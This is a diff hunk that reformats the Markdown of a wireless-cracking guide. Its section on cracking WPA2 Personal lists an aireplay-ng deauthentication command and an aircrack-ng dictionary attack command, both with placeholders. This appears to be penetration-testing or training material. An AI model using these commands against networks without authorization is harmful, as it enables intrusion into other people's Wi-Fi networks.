@@ -57,13 +57,16 @@
 
 
 2. Cracking WPA2 Personal.
+```
    -	Follow the steps a-g, as shown in the WEP Cracking.
    -	Deauthenticate the connected user to capture the WPA 4 way handshake, in which WPA keystream is present.
-      `aireplay-ng -0 1 –a <AP Mac> -c <Client Mac> wlan0`
+
+      # aireplay-ng -0 1 –a <AP Mac> -c <Client Mac> wlan0`
    -	Note the airodump-ng output to check if the WPA Handshake is captured.
    -	Once the WPA handshake is captured, crack the password using aircrack-ng dictionary attack.
-      `aircrack-ng <captured file> -w <Dictionary file>`
 
+      # aircrack-ng <captured file> -w <Dictionary file>`
+```
 
 3. Cracking WPA2 Enterprise.
 
